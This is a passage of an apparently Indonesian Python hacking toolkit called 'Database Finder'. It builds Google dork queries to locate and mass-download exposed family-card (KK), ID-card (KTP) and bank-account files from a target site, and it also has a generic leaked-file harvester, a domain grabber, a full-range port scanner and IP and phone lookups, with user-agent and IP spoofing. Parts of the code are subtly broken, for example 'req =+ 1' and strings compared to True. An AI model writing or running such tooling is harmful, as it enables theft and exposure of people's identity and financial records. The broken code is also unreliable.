⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣧⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣧⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡇⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣧⠀⢀⣠⣴⣾⠿⠟⠛⠛⠛⠛⠛⠛⠛⠻⠿⢿⣷⣦⣄⠀⠀⣾⣿⣿⣿⣿⣿⣿⡄⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣧⢿⡿⠋⠀⣀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣤⡀⠈⠛⢿⡿⣼⣿⣿⣿⣿⣿⣿⣿⠇
           ⣿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠘⢿⣿⣿⣿⣿⣿⣿⣿⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⠏⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠇⠘⣿⡟⠙⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⢻⣿⠀⠸⠿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀
⠀⣰⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⣿⣿⣿⣿⡇⠀⣿⣧⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⣼⡟⠀⣾⣿⣿⣿⣷⠀⠀⠀ ⠉⠛⢿⣿⣿⣿⣿⣿⡄⠀
⢀⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡄⠘⣿⣷⣤⣀⣀⡀⠀⣈⣩⣿⣿⣍⣁⠀⣀⣀⣀⣠⣼⣿⠇⢠⣿⣿⣿⣿⡟⠀⠀⠀ ⠀⠀⠀⠙⢿⣿⣿⣿⣷⠀
⣸⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⡟⠀⣨⣿⣿⣿⣿⣿⣿⣿⡿⢀⡀⢿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀ ⠀⠀⠀⠀⠈⢿⣿⣿⣿⡇
⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡇⠀⣿⣿⣿⡿⠛⠉⣿⣿⣧⣾⣷⣼⣿⣿⡟⠋⠉⢻⣿⡿⠀⣸⣿⣿⣿⣿⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠘⣿⣿⣿⡇
⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣄⠈⠋⠉⠒⠀⠀⣿⣿⣿⣿⢿⡟⣻⣿⡇⠀⠀⠙⠉⣀⣴⣿⣿⣿⣿⠇⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇
⢹⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣾⣷⣄⡀⠀⣿⣿⣿⣿⢸⡇⣿⣿⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠘⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⢸⣿⢸⡇⣿⡿⠀⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⢸⣿⣿⠁
⠀⠙⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⡿⠀⢸⣿⢸⣿⢸⡇⣿⡇⠀⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠘⠿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⡿⣱⡆⠸⣿⢸⣿⣿⡇⣿⡇⠀⣞⠿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣷⣄⣈⡈⠉⠈⢁⣉⣁⣴⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣷⣶⣶⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣶⣶⣾⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠛⠋⠉⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

██████╗  █████╗ ████████╗ █████╗ ██████╗  █████╗ ███████╗███████╗    
██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝    
██║  ██║███████║   ██║   ███████║██████╔╝███████║███████╗█████╗      
██║  ██║██╔══██║   ██║   ██╔══██║██╔══██╗██╔══██║╚════██║██╔══╝      
██████╔╝██║  ██║   ██║   ██║  ██║██████╔╝██║  ██║███████║███████╗    
╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝    
                                                                     
███████╗██╗███╗   ██╗██████╗ ███████╗██████╗                         
██╔════╝██║████╗  ██║██╔══██╗██╔════╝██╔══██╗                        
█████╗  ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝                        
██╔══╝  ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗                        
██║     ██║██║ ╚████║██████╔╝███████╗██║  ██║                        
╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝                        
    """)
    print(f"{M}[{P}01{M}] {P}KartuKeluarga Finder")
    print(f"{M}[{P}02{M}] {P}Rekening Finder")
    print(f"{M}[{P}03{M}] {P}KTP Finder")
    print(f"{M}[{P}04{M}] {P}Custom Finder")
    print(f"{M}[{P}05{M}] {P}Find With Dork")
    dabass = input(f"\n{M}[{P}+{M}] {O}Select Menu -> {P}")
    
    if dabass in["01","1"]:
        try:
            trgt = input(f'\n{M}[{P}+{M}] {O}Input Target : {P}')
            os.makedirs(trgt)
            for data in db1:
                 req =+ 1
                 file_exists = ('.google-cookie')
                 if file_exists == True:
                  os.remove('.google-cookie')
                 rand_user = random.choice(user_agents)
                 rand_ipv4 = random.choice(address)
                 rand_ipv6 = random.choice(ip6)
                 rand_user = random.choice(user_agents)
                 print(f'{M}[{P}~{M}] {O} Processing {M}[{P}~{M}] {O}Searching Info For KK..')
                 for kk in search(f'site:{trgt} filetype:{data}', tld='com', num=int(f'{req}'), start=0, stop=None):
                     print(f'{M}[{P}+{M}] {P}Found ! {M}[{P}+{M}]')
                     print(f'{H}{kk}')
                     wget.download(kk, out=trgt)
        except urllib.error.HTTPError as e:
             if e.code == 404:
                 print(f' {M}[404] Download Fail, Skipping')
                 Continue()
                 a()  
             if e.code == 403:
                 print(f' {M}[403] Download Fail, Skipping')
                 Continue()
                 a()  
             if e.code == 429:
                 print(f' {M}[429] Download Fail, Please Wait.')
                 time.sleep(5)
                 Continue()
                 a()
    elif dabass in["02","2"]:
        try:
             trgt2 = input(f'\n{M}[{P}+{M}] {O}Target : {P}')
             os.makedirs(trgt2)
             for datas in db2:
                 req =+ 1
                 file_exists = ('.google-cookie')
                 if file_exists == True:
                  os.remove('.google-cookie')
                 rand_user = random.choice(user_agents)
                 print(f'{M}[{P}~{M}] {O}Processing {M}[{P}~{M}] {O}Searching Info For Rekening...')
                 for rekeng in search(f'site:{trgt2} filetype:{datas}', tld="com", num=int(f'{req}'), start=0, stop=None):
                     print(f'{M}[{P}+{M}] {P}Found ! {M}[{P}+{M}]')
                     print(f'{H}{rekeng}')
                     wget.download(rekeng, out=trgt2)
        except urllib.error.HTTPError as e:
             if e.code == 404:
                 print(M + f' [404] Download Fail, Skipping')
                 Continue()
                 a()  
             if e.code == 403:
                 print(M + f' [403] Download Fail, Skipping')
                 Continue()
                 a()  
             if e.code == 429:
                 print(M + f' [429] Download Fail, Please Wait.')
                 time.sleep(5)
                 Continue()
                 a()
    elif dabass in["03","3"]:
        try:
             trgt3 = input(f"{M}[{P}0+{M}] {O}Enter Target : {P}")
             os.makedirs(trgt3)
             db3 = ["xls", "pdf", "csv", f"ktp.pdf", f"ktp.xls", f"ktp.xlsx", f"ktp.csv", f"ktp" f"admin/database/ktp.pdf", f"database/ktp.pdf", f"admin/data/ktp.pdf", f"ktp.pdf", f"pdf/ktp.pdf", f"ktp.csv", f"ktp.xlsx", f"admin/csv/ktp.csv", f"database/ktp.csv", f"admin/dataset/ktp.csv", f"csv/ktp.csv", f"ktp.xls", f"database/ktp.xls", f"admin/data/ktp.xls", f"xls/ktp.xls"]
             for datase in db3:
                 req =+ 1
                 file_exists = ('.google-cookie')
                 if file_exists == True:
                  os.remove('.google-cookie')
                 rand_user = random.choice(user_agents)
                 print(f'{M}[{P}~{M}] {O}Processing {M}[{P}~{M}] {O} Searching KTP..')
                 for databases in search(f'site:{trgt3} filetype:{datase}', tld="com", num=int(f'{req}'), start=0, stop=None):
                     print(f'{M}[{P}+{M}] {P}Found ! {M}[{P}+{M}]{P}')
                     print(H + f'{databases}')
                     wget.download(databases, out=trgt3)
        except urllib.error.HTTPError as e:
             if e.code == 404:
                 print(f' {M}[404] Download Fail, Skipping')
                 Continue()
                 a()  
             if e.code == 403:
                 print(f' {M}[403] Download Fail, Skipping')
                 Continue()
                 a()  
             if e.code == 429:
                 print(f' {M}[429] Download Fail, Please Wait.')
                 
                 time.sleep(5)
                 Continue()
                 a()
    elif dabass in["04","4"]:
        try:
             db_types = input(f"{M}[{P}+{M}] {O}Enter Database Types [Example : SimCard]: {P}")
             trgt4 = input(f'\n{M}[{P}+{M}] {O}Enter Target : {P}')
             os.makedirs(trgt4)
             db4 = ["xls", "pdf", "csv", f"{db_types}.pdf", f"{db_types}.xls", f"{db_types}.xlsx", f"{db_types}.csv", f"{db_types}" f"admin/database/{db_types}.pdf", f"database/{db_types}.pdf", f"admin/data/{db_types}.pdf", f"{db_types}.pdf", f"pdf/{db_types}.pdf", f"{db_types}.csv", f"{db_types}.xlsx", f"admin/csv/{db_types}.csv", f"database/{db_types}.csv", f"admin/dataset/{db_types}.csv", f"csv/{db_types}.csv", f"{db_types}.xls", f"database/{db_types}.xls", f"admin/data/{db_types}.xls", f"xls/{db_types}.xls"]
             for datase in db4:
                 req =+ 1
                 file_exists = ('.google-cookie')
                 if file_exists == True:
                  os.remove('.google-cookie')
                 rand_user = random.choice(user_agents)
                 print(f'{M}[{P}+{M}] {O} Processing {M}[{P}+{M}] {O}Searching Info For {db_types}..')
                 for databases in search(f'site:{trgt4} filetype:{datase}', tld="com", num=int(f'{req}'), start=0, stop=None):
                     print(f'{M}[{P}+{M}] {P}Found ! {M}[{P}+{M}]')
                     print(f'{H}{databases}')
                     wget.download(databases, out=trgt4)
        except urllib.error.HTTPError as e:
             if e.code == 404:
                 print(f' {M}[404] Download Fail, Skipping')
                 Continue()
                 a()  
             if e.code == 403:
                 print(f' {M}[403] Download Fail, Skipping')
                 Continue()
                 a()  
             if e.code == 429:
                 print(f' {M}[429] Download Fail, Please Wait.')
                 time.sleep(5)
                 Continue()
                 a()  
    elif dabass in["05","5"]:
        try:
                  db1 = ["xls", "pdf", "csv", "kartu-keluarga.pdf", "kk.pdf", "kk.xls", "kk.xlsx", "kk.csv", "database/kk.pdf", "admin/data/kk.pdf", "kartukeluarga.pdf", "pdf/kk.pdf", "kk.csv", "kartukeluarga.csv", "admin/csv/kk.csv", "database/kk.csv", "admin/dataset/kk.csv", "csv/kk.csv", "kk.xls", "database/kk.xls", "admin/data/kk.xls", "xls/kk.xls"]
                  db2 = ["xls", "pdf", "csv", "rekening.pdf", "rekening.xls", "rekening.xlsx", "rekening.csv", "database/rekening.pdf", "admin/data/rekening.pdf", "rekening.pdf", "pdf/rekening.pdf", "rekening.csv", "rekening.xlsx", "admin/csv/rekening.csv", "database/rekening.csv", "admin/dataset/rekening.csv", "csv/rekening.csv", "rekening.xls", "database/rekening.xls", "admin/data/rekening.xls", "xls/rekening.xls"]
                  print("1. Kartu Keluarga")
                  print("2. Rekening")
                  dork = input("\n{M}[{P}+{M}] {O}Choice : {P}")
                  numr =+ 1
    
                  requ = 0
                  counter = 0    
                  if dork.startswith("1"):
                      pass
                      for results in search(db1,tld="com", lang="id", num=int(numr), start=0, stop=None, pause=2):
                           rand_user = random.choice(user_agents)
                           counter = counter + 1
                           print("{M}[{P}+{M}] {P}Found : {H} : ", results, counter)
                           wget.download(results, out=results)
                           time.sleep(0.5) 
                           requ += 1       
                           if requ >= int(numr):
                               break       
                  elif dork.startswith("2"):
                      pass                 
                      for results in search(db2,tld="com", lang="id", num=int(numr), start=0, stop=None, pause=2):
                           rand_user = random.choice(user_agents)
                           counter = counter + 1
                           print(f"{M}[{P}+{M}] {P}Found : {H}", results, counter)
                           wget.download(results, out=results)
                           time.sleep(0.5)
                           requ += 1
                           if requ >= int(numr):
                               break        
        except urllib.error.HTTPError as e:
                       if e.code == 429:
                           print(f' {M}[429] Error, Try Again Later.')
                           
                           Continue()
                           a()    
                       
        print (f"{H}Done.")
        Continue()
        a()
            
    
def data_leak():
    from googlesearch import search 
    from requests.exceptions import ConnectionError
    from subprocess import getoutput
    from os.path import exists
    import urllib.request 
    from urllib.parse import urlparse
    clear()
    MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1
    MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
    def randomipv4():
        return  ipaddress.IPv4Address._string_from_ip_int(
            random.randint(0, MAX_IPV4)
        )
    def randomipv6():
        return ipaddress.IPv6Address._string_from_ip_int(
            random.randint(0, MAX_IPV6)
        )
    address = randomipv4()
    ip6 = randomipv6()
    pass
    global domain

    global file_types
    file_types = ['doc', 'dta', 'shx', 'dbf', 'shp', 'db', 'mdf', 'mpd', 'ndb', 'docx', 'docm', 'dot', 'dotx', 'dotm','ppt', 'pptx', 'pps', 'ppsx', 'ppsm', 'pptm', 'potm', 'pot','csv', 'pdf', 'xls', 'xlsx', 'xslsm', 'xlt', 'xltx', 'xltm', 'sql', 'txt']
                   
    wedus()
    target = input(f"\n{M}[{P}+{M}]{O} Input Target Site : {P}")
    dirt = ("")
    counter = 1
    counter = counter + 1

    os.makedirs(target)

    def download_files(*args):
        # Nama direktori tempat Anda ingin menyimpan file
        target_directory = target
        # Loop melalui argumen (hasil pencarian)
        for result in args:
            # Ekstrak nama file dari URL menggunakan urlparse
            parsed_url = urlparse(results)
            file_name = os.path.basename(parsed_url.path)

            # Gabungkan direktori dengan nama file
            file_path = os.path.join(target_directory, file_name)

            # Unduh file
            response = requests.get(results)

            # Simpan file ke direktori yang ditentukan
            if response == True:
                with open(file_path, "wb") as file:
                    file.write(response.content)

    def dorker():
        request = 0
        path = target
        isdir = os.path.isdir(path)
        if isdir == True:
            pass
        else:
            os.mkdir(target)  
        os.chdir(target)    
    for files in file_types:
       try: 
            file_exists = exists('.google-cookie')
            if file_exists == True:
             os.remove('.google-cookie')
            rand_user = random.choice(user_agents)
            rand_ipv4 = random.choice(address)
            rand_ipv6 = random.choice(ip6)
            print(M + f'{M}[{P}~{M}]{O} Processing {M}[{P}~{M}]{O}: Searching {files}..')
            for results in search(f'site:{target} filetype:{files}', tld='com', lang='en', num=3, start=0, stop=None, pause=10):
             print(H + f'[+]Found[+] : ')
             print(H + f'\033[1;33m{results}')
             wget.download(results, out=target)
             requ =+ 1
       except urllib.error.HTTPError as e:
             if e.code == 404:
                 print(M + f' [404] Download Fail, Skipping')
                 continue
             if e.code == 403:
                 print(M + f' [403] Download Fail, Skipping')
                 continue
             if e.code == 429:
                 print(M + f' [429] Download Fail, Please Wait.')
                 time.sleep(5)
             else:
                 continue    
       except FileExistsError:
           print(f'File {target} Exists.')
       except OSError:
                 continue
       except urllib.error.URLError:
                print(f'[Error] File {files} could not be downloaded. Skipping.')
                continue
       except ModuleNotFoundError:
                print(f'[Error] Did you already install requirements.txt?')
       except UnicodeDecodeError:
                continue 

    print ("{M}[{P}+{M}]{O} Done...")
    Continue()
    a()

from datetime import datetime, timedelta
from multiprocessing.dummy import Pool as ThreadPool

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

try:
    os.mkdir("Result")
except:
    pass

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
Z = random.choice([P,M,H,K,B,U,O,N])
q = f"{P}[{M}+{P}] {B}"
all_pages_link = []
init(autoreset=True)

def GeneratePageTopSite(tld, totalPage):
    try:
        arr = []
        
        for i in range(1, totalPage + 1):
            arr.append(f"https://www.topsitessearch.com/domains/.{tld}/{i}")
        
        return arr
    except:
        return []
        
def GrabTopSite(url):
    try:
        page = url.split("/")[-1]
        req = requests.get(url, timeout=10)
        domains = re.findall(r'domain=(.*?)"', req.text)
        
        if len(domains) == 0:
            sys.stdout.write(f"\n{K}---> {B}0 {M}Domain Grabbed From Page : {P}{page}!")
        else:
            sys.stdout.write(f"\n{P}---> {B}{len(domains)} {H}Domain Grabbed From Page :{P} {page}!")
            
            for domain in domains:
                open("Result/grab_domain.txt", "a").write(domain + "\n")
    except:
        sys.stdout.write(f"\n{M}---> {B}0 {M}Domain Grabbed From Page :{P} {page}!")
        
def DomainGrabber():
    inp_tld = input(f"{M}[{P}+{M}] {B}Input Domain (ex. com) : {K}")
    inp_page = int(input(f"{M}[{P}+{M}] {B}Total Page (ex: 200) :{K} "))
    list_url = GeneratePageTopSite(inp_tld, inp_page)
    
    start_time = time.time()
    
    pool = ThreadPool(20)
    pool.map(GrabTopSite, list_url)
    pool.close()
    pool.join()
    
    end_time = time.time()

    print(f"\n{O}[{H}-{O}] {P}Time Taken {H}{str(end_time - start_time).split('.')[0]} {P}Sec")

def ip_port():
    try:
       import socket
       import concurrent.futures
    except Exception as e:
       ErrorModule(e)
       
    Title("Ip & Domain Port Scanner")
    
    def scan_port(ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(f"{M}[{P}{current_time_hour()}{M}] {O} Status: {P}Open{M} | Port: {P}{port}")
            sock.close()
        except Exception as e:
            print(f"{M}[{P}{current_time_hour()}{M}] {M} Error: {P}{e}")
            return
    
    def scan_ports(ip, start_port, end_port):
        with concurrent.futures.ThreadPoolExecutor() as executor:
            results = {executor.submit(scan_port, ip, port): port for port in range(start_port, end_port + 1)}
    
    ip = input(f"\n{M} Enter Ip or Domain -> {color.RESET}")
    print(f"{WAIT} Search Port..")
    start_port = 1
    end_port = 65535
    
    scan_ports(ip, start_port, end_port)
    Continue()
    a()
def web_ip():
    def get_ip_address(domain):
        try:
            ip = socket.gethostbyname(domain)
        except:
            ip = "None"
        return ip
    
    website = input(f"\n{M}[{P}+{M}]{O} Website Url -> {color.RESET}")
    print(f"{M}{WAIT} Information Recovery..")
    if "https://" in website:
        secure = True
        domain = website.replace("https://", "")
    elif "http://" in website:
        secure = False
        domain = website.replace("http://", "")
    else:
        secure = None
        domain = website
    
    ip = get_ip_address(domain)
    
    response = requests.get(f"http://ip-api.com/json/{ip}")
    data = response.json()
    status = data["status"]
    if status in ["fail"]:
        status = "Invalid"
        ip_adress, isp, org, as_number = "None", "None", "None", "None"
    else:
        status = "Valid"
        ip_adress = data["query"]
        isp = data["isp"]
        org = data["org"]
        as_number = data["as"]
    
    print(f"""
{M}[{P}+{M}]{O} Website : {P}{website}{color.RED}
{M}[{P}+{M}]{O} Domain  : {P}{domain}{color.RED}
{M}[{P}+{M}]{O} Ip      : {P}{ip}{color.RED}
{M}[{P}+{M}]{O} Status  : {P}{status}{color.RED}
{M}[{P}+{M}]{O} Secure  : {P}{secure}{color.RED}
{M}[{P}+{M}]{O} Isp     : {P}{isp}{color.RED}
{M}[{P}+{M}]{O} Org     : {P}{org}{color.RED}
{M}[{P}+{M}]{O} As      : {P}{as_number}{M}
{color.RESET}""")
    
    Continue()
    a()

def IP_Track():
    ip = input(f"{M}[{P}+{M}]{O} Enter IP target : {P}")  # INPUT IP ADDRESS
    print()
    Write.Print("꧁ INFORMATION IP ADDRESS ꧂ ", Colors.blue_to_green, interval=0.05)
    req_api = requests.get(f"http://ipwho.is/{ip}")  # API IPWHOIS.IS
    ip_data = json.loads(req_api.text)
    time.sleep(2)
    print(f"\n{M}[{P}+{M}]{O} IP target       :{P}", ip)
    print(f"{M}[{P}+{M}]{O} Type IP         :{P}", ip_data["type"])
    print(f"{M}[{P}+{M}]{O} Country         :{P}", ip_data["country"])
    print(f"{M}[{P}+{M}]{O} Country Code    :{P}", ip_data["country_code"])
    print(f"{M}[{P}+{M}]{O} City            :{P}", ip_data["city"])
    print(f"{M}[{P}+{M}]{O} Continent       :{P}", ip_data["continent"])
    print(f"{M}[{P}+{M}]{O} Continent Code  :{P}", ip_data["continent_code"])
    print(f"{M}[{P}+{M}]{O} Region          :{P}", ip_data["region"])
    print(f"{M}[{P}+{M}]{O} Region Code     :{P}", ip_data["region_code"])
    print(f"{M}[{P}+{M}]{O} Latitude        :{P}", ip_data["latitude"])
    print(f"{M}[{P}+{M}]{O} Longitude       :{P}", ip_data["longitude"])
    lat = int(ip_data['latitude'])
    lon = int(ip_data['longitude'])
    print(f"{M}[{P}+{M}]{O} Maps            :{P}", f"https://www.google.com/maps/@{lat},{lon},8z")
    print(f"{M}[{P}+{M}]{O} EU              :{P}", ip_data["is_eu"])
    print(f"{M}[{P}+{M}]{O} Postal          :{P}", ip_data["postal"])
    print(f"{M}[{P}+{M}]{O} Calling Code    :{P}", ip_data["calling_code"])
    print(f"{M}[{P}+{M}]{O} Capital         :{P}", ip_data["capital"])
    print(f"{M}[{P}+{M}]{O} Borders         :{P}", ip_data["borders"])
    print(f"{M}[{P}+{M}]{O} Country Flag    :{P}", ip_data["flag"]["emoji"])
    print(f"{M}[{P}+{M}]{O} ASN             :{P}", ip_data["connection"]["asn"])
    print(f"{M}[{P}+{M}]{O} ORG             :{P}", ip_data["connection"]["org"])
    print(f"{M}[{P}+{M}]{O} ISP             :{P}", ip_data["connection"]["isp"])
    print(f"{M}[{P}+{M}]{O} Domain          :{P}", ip_data["connection"]["domain"])
    print(f"{M}[{P}+{M}]{O} ID              :{P}", ip_data["timezone"]["id"])
    print(f"{M}[{P}+{M}]{O} ABBR            :{P}", ip_data["timezone"]["abbr"])
    print(f"{M}[{P}+{M}]{O} DST             :{P}", ip_data["timezone"]["is_dst"])
    print(f"{M}[{P}+{M}]{O} Offset          :{P}", ip_data["timezone"]["offset"])
    print(f"{M}[{P}+{M}]{O} UTC             :{P}", ip_data["timezone"]["utc"])
    print(f"{M}[{P}+{M}]{O} Current Time    :{P}", ip_data["timezone"]["current_time"])

def phone_info():
    import phonenumbers 
    from phonenumbers import carrier, geocoder, timezone
    manuk()
    User_phone = input(
        f"\n {M}[{P}+{M}] {O}Enter Phone Number (+62xxxx) -> {P}") 
    default_region = "ID" 

    parsed_number = phonenumbers.parse(User_phone, default_region) 
    region_code = phonenumbers.region_code_for_number(parsed_number)
    jenis_provider = carrier.name_for_number(parsed_number, "en")
    location = geocoder.description_for_number(parsed_number, "id")
    is_valid_number = phonenumbers.is_valid_number(parsed_number)
    is_possible_number = phonenumbers.is_possible_number(parsed_number)
    formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
    formatted_number_for_mobile = phonenumbers.format_number_for_mobile_dialing(parsed_number, default_region,
                                                                                with_formatting=True)
    number_type = phonenumbers.number_type(parsed_number)
    timezone1 = timezone.time_zones_for_number(parsed_number)
    timezoneF = ', '.join(timezone1)

    Write.Print(
    f"""
─═════════════════════════ቐቐ═════════════════════════─
              INFORMATION PHONE NUMBERS
─═════════════════════════ቐቐ═════════════════════════─""", Colors.blue_to_white, interval=0.005)
    print(f"\n{M}[{P}+{M}] {O}Location             :{P} {location}")
    print(f"{M}[{P}+{M}] {O}Region Code          :{P} {region_code}")
    print(f"{M}[{P}+{M}]{O} Timezone             :{P} {timezoneF}")
    print(f"{M}[{P}+{M}] {O}Operator             :{P} {jenis_provider}")
    print(f"{M}[{P}+{M}] {O}Valid number         :{P} {is_valid_number}")
    print(f"{M}[{P}+{M}] {O}Possible number      :{P} {is_possible_number}")
